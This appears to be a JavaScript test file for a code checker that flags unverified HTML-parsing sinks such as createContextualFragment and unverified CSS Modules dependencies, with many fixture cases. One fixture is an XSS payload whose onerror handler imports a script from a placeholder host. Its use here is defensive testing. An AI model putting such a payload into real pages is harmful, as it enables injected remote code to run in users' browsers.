import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

// Registered by the existing checker test owner. All inputs are authored text;
// neither HTML handlers nor CSS/plugin/package payloads are executed.
export function registerBoundedAnalysisProfileConsumers({
  test, probeReview, createRoot, writeValidMatrices, commitFixtureRoot,
  writeSelfHostedPromotion, promotionOptions, collectCoverageMatrixIssues,
}) {
  const payload = `'<img src=x onerror="import(\\'https://cdn.example/runtime.js\\')">'`;
  const ranges = [
    ['native document acquisition and insertion', `const fragment=document.createRange().createContextualFragment(${payload});document.body.append(fragment);`, true],
    ['qualified window acquisition', `window.document.createRange().createContextualFragment(markup);`, true],
    ['qualified self acquisition', `self.document.createRange().createContextualFragment(markup);`, true],
    ['qualified global acquisition', `globalThis.document.createRange().createContextualFragment(markup);`, true],
    ['document alias', `const doc=document;doc.createRange().createContextualFragment(markup);`, true],
    ['Range constructor', `new Range().createContextualFragment(markup);`, true],
    ['constructor alias', `const Native=globalThis.Range;new Native().createContextualFragment(markup);`, true],
    ['constructor destructuring', `const {Range:Native}=window;new Native().createContextualFragment(markup);`, true],
    ['range alias', `const original=document.createRange();const alias=original;alias.createContextualFragment(markup);`, true],
    ['computed method', `const range=document.createRange();range['createContextualFragment'](markup);`, true],
    ['opaque receiver', `function render(range){range.createContextualFragment(markup);}`, true],
    ['type is not provenance', `function render(range:Range){range.createContextualFragment(markup);}`, true],
    ['unknown factory', `const range=acquireRange();range.createContextualFragment(markup);`, true],
    ['static benign payload still unverified', `document.createRange().createContextualFragment('<p>Text</p>');`, true],
    ['dynamic native member', `const range=document.createRange();range[method](markup);`, true],
    ['extracted method', `const range=document.createRange();const parse=range.createContextualFragment;parse(markup);`, true],
    ['method call', `const range=document.createRange();range.createContextualFragment.call(range,markup);`, true],
    ['method apply', `const range=document.createRange();range.createContextualFragment.apply(range,[markup]);`, true],
    ['bound method invocation', `const range=document.createRange();const parse=range.createContextualFragment.bind(range);parse(markup);`, true],
    ['Reflect apply', `const range=document.createRange();Reflect.apply(range.createContextualFragment,range,[markup]);`, true],
    ['rebound native value', `let range={};range=document.createRange();range.createContextualFragment(markup);`, true],
    ['document shadow retains unknown return', `function render(document){document.createRange().createContextualFragment(markup);}`, true],
    ['constructor shadow retains unknown instance', `function render(Range){new Range().createContextualFragment(markup);}`, true],
    ['business receiver', `const range={createContextualFragment(){return null;}};range.createContextualFragment(markup);`, false],
    ['business alias', `const business={createContextualFragment(){}};const range=business;range.createContextualFragment(markup);`, false],
    ['business factory return is unsupported', `const document={createRange(){return {};}};document.createRange().createContextualFragment(markup);`, true],
    ['shadowed factory acquisition is inert', `function render(document){document.createRange();}`, false],
    ['shadowed constructor acquisition is inert', `function render(Range){new Range();}`, false],
    ['inert acquisition', `const range=document.createRange();const parse=range.createContextualFragment.bind(range);`, false],
    ['inert string and comment', `const description="document.createRange().createContextualFragment(markup)";/* new Range().createContextualFragment(markup); */`, false],
  ];
  const css = [
    ['governed composition', `.root{composes:base from '@proto.ui/prototypes-base/styles.module.css';}`, 'module.css', true],
    ['governed ICSS', `:import('@proto.ui/prototypes-base/styles.module.css'){base:base;}.root{color:red}`, 'module.css', true],
    ['escaped dependency grammar', String.raw`.root{compo\73 es:base fr\6fm '@proto.ui/\70rototypes-base/styles.module.css';}`, 'module.css', true],
    ['comment-separated grammar', `.root{composes/**/:/**/base/**/from/**/'@proto.ui/prototypes-base/styles.module.css';}`, 'module.css', true],
    ['opaque target', `.root{composes:base from target;}`, 'module.css', true],
    ['malformed composition declaration', `.root{composes base from './base.module.css';}`, 'module.css', true],
    ['URL target is unsupported', `.root{composes:base from url('./base.module.css');}`, 'module.css', true],
    ['nonmodule dependency context', `.root{composes:base from './base.css';}`, 'module.css', true],
    ['third-party resolver context', `.root{composes:base from 'third-party/base.module.css';}`, 'module.css', true],
    ['unsupported value imports', `@value primary from './base.module.css';.root{color:primary}`, 'module.css', true],
    ['unsupported composition spelling', `.root{compose-with:base from './base.module.css';}`, 'module.css', true],
    ['unsupported selector', `.root:hover{composes:base from './base.module.css';}`, 'module.css', true],
    ['multiple targets', `.root{composes:base from './a.module.css' from './b.module.css';}`, 'module.css', true],
    ['malformed ICSS', `:import('./base.module.css');`, 'module.css', true],
    ['compound ICSS selector', `.root :import('./base.module.css'){base:base}`, 'module.css', true],
    ['unterminated module comment', `.root{color:red}/*`, 'module.css', true],
    ['preprocessor module context', `.root{color:red}`, 'module.scss', true],
    ['Vue module style context', `<template><main>Static</main></template><style module>.root{color:red}</style>`, 'vue', true],
    ['comments and strings', `/* :import('@proto.ui/runtime/a.module.css'){} */.root::before{content:"composes:base from '@proto.ui/runtime/b.module.css';";}`, 'module.css', false],
    ['quoted delimiters', `.root::before{content:"}; :import(";}.root{color:red}`, 'module.css', false],
    ['local and global composition', `.root{composes:base another;composes:external from global;}`, 'module.css', false],
    ['ordinary CSS composition control', `.root{composes:base from '@proto.ui/prototypes-base/styles.module.css';}`, 'css', false],
    ['ordinary CSS ICSS control', `:import('@proto.ui/prototypes-base/styles.module.css'){base:base}`, 'css', false],
    ['ordinary Vue style control', `<template><main>Static</main></template><style>.root{composes:base from '@proto.ui/prototypes-base/styles.module.css';}</style>`, 'vue', false],
  ];
  for (const kind of ['website', 'harness']) {
    for (const [name, source, reject] of ranges)
      test(`issue854 Range ${kind}: ${name}`, () => {
        const issues = probeReview('854/r4193812704', kind, source);
        assert.equal(issues.some((issue) => /DOM HTML sink.*unverified/u.test(issue)), reject, issues.join('\n'));
        if (!reject) assert.deepEqual(issues, []);
      });
    for (const [name, source, extension, reject] of css)
      test(`issue854 CSS ${kind}: ${name}`, () => {
        const issues = probeReview('854/r4193812719', kind, source, extension);
        assert.equal(issues.some((issue) => /CSS Modules.*unverified|raw Proto UI import/u.test(issue)), reject, issues.join('\n'));
        if (!reject) assert.deepEqual(issues, []);
      });
    for (const syntax of ['composes', 'icss'])
      test(`issue854 CSS ${kind}: installed package ${syntax} retains governed boundary`, () => {
        const root = createRoot();
        const source = kind === 'website' ? 'apps/www/src/components/ModuleConsumer.ts' : 'apps/agent-harness/src/run/ModuleConsumer.ts';
        const packageRoot = path.join(root, 'node_modules/analysis-style');
        fs.mkdirSync(packageRoot, { recursive: true });
        fs.writeFileSync(path.join(packageRoot, 'package.json'), JSON.stringify({name:'analysis-style',version:'1.0.0',exports:'./entry.module.css'}));
        fs.writeFileSync(path.join(packageRoot, 'entry.module.css'), syntax === 'composes' ?
          `.root{composes:base from '@proto.ui/prototypes-base/base.module.css';}` :
          `:import('@proto.ui/prototypes-base/base.module.css'){base:base}`);
        fs.mkdirSync(path.dirname(path.join(root, source)), { recursive: true });
        fs.writeFileSync(path.join(root, source), `import 'analysis-style';`);
        writeValidMatrices(root, {}, kind === 'harness' ? {Path:source} : {}, {
          websiteBindings: kind === 'website' ? [[source, ['www.shell.primary-nav']]] : [],
        });
        const issues = collectCoverageMatrixIssues({rootDir:root});
        assert.ok(issues.some((issue) => /raw Proto UI import.*analysis-style/u.test(issue)), issues.join('\n'));
      });
  }
  for (const syntax of ['composes', 'icss']) {
    for (const mutation of ['changed', 'missing', 'symlink'])
      test(`issue854 CSS promotion: ${syntax} ${mutation} dependency bytes stay unverified`, () => {
        const root = createRoot();
        const implementationPath = 'apps/www/src/components/override/Search.astro';
        const directory = path.dirname(path.join(root, implementationPath));
        const websiteBindings = [[implementationPath, ['www.shell.search']]];
        fs.mkdirSync(directory, {recursive:true});
        fs.writeFileSync(path.join(root, implementationPath), `---\nimport './surface.module.css';\n---\n<main class="root">Search</main>`);
        fs.writeFileSync(path.join(directory, 'surface.module.css'), syntax === 'composes' ?
          `.root{composes:base from './base.module.css';}` : `:import('./base.module.css'){base:base}.root{color:red}`);
        const dependency = path.join(directory, 'base.module.css');
        fs.writeFileSync(dependency, '.base{color:red}');
        writeValidMatrices(root, {Path:implementationPath}, {}, {websiteBindings});
        const revision = commitFixtureRoot(root);
        writeSelfHostedPromotion(root, revision, {websiteBindings,matrixOverrides:{Path:implementationPath}});
        const options = {rootDir:root,...promotionOptions(revision)};
        assert.deepEqual(collectCoverageMatrixIssues(options), []);
        if (mutation === 'changed') fs.writeFileSync(dependency, '.base{color:blue}');
        else {
          fs.unlinkSync(dependency);
          if (mutation === 'symlink') {
            fs.writeFileSync(path.join(directory, 'replacement.module.css'), '.base{color:red}');
            fs.symlinkSync('replacement.module.css', dependency);
          }
        }
        const issues = collectCoverageMatrixIssues(options);
        assert.ok(issues.some((issue) => mutation === 'changed' ?
          /promoted dependency.*base\.module\.css.*differs from evidence Commit/u.test(issue) :
          /(?:CSS Modules.*unverified|symlink.*unverified)/u.test(issue)), issues.join('\n'));
      });
  }
}
